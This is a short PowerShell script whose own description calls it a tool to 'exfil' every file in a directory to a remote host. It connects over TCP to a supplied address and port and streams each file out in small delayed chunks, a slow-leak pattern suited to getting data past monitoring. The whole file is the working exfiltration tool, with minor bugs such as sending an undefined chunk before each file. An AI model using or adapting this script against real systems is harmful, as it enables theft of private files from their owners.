﻿<#	
	.NOTES
	===========================================================================
	 Created with: 	SAPIEN Technologies, Inc., PowerShell Studio 2016 v5.2.128
	 Created on:   	11/13/2017 11:55 AM
	 Created by:   	Daryl Bennett <kd8bny@gmail.com>
	 Organization: 	
	 Filename:     	
	===========================================================================
	.DESCRIPTION
		Exfil all files in a directory to remote client over a period of time, in small chunks.
#>
param (
	[parameter(
		Mandatory = $true		
	)]
	[string]$path,
	[parameter(
		Mandatory = $true
	)]
	[string]$remote,
	[parameter(
			   Mandatory = $true
	)]
	[int]$remote_port,
	[parameter(
		Mandatory = $false
	)]
	[string] $delay = 1000,
	[parameter(
	   Mandatory = $false
	)]
	[string] $buffer = 4096
)

function sendBytes ($chunk)
{
	if ($client.Connected)
	{
		$ServerStream = $client.GetStream()
		$ServerStream.Write($chunk, 0, $chunk.length)
		$ServerStream.Flush()
	}
	else
	{
		Write-Host -ForegroundColor Red $_.Exception.Message
		exit -1
	}
}

function TCPConnect($ip, $port)
{
	try
	{
		$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
	}
	catch
	{
		Write-Host -ForegroundColor Red $_.Exception.Message
		exit -1
	}
	
	return $client
}

$client = TCPConnect $remote $remote_port
$items = Get-ChildItem -Path $path

foreach ($item in $items)
{
	sendBytes($chunk)
	
	# Ignore directories now. Probably traverse them later?
	if ($item.Attributes -ne "Directory")
	{
		[byte[]]$file_bytes = get-content -encoding byte -path $item
		for ($i = 0; $i -lt $file_bytes.Length; $i += $buffer)
		{
			[byte[]]$chunk = $file_bytes[$i..($i+$buffer)]
			sendBytes($chunk)
			Start-Sleep -m $delay
		}
	}
}

$client.Close()
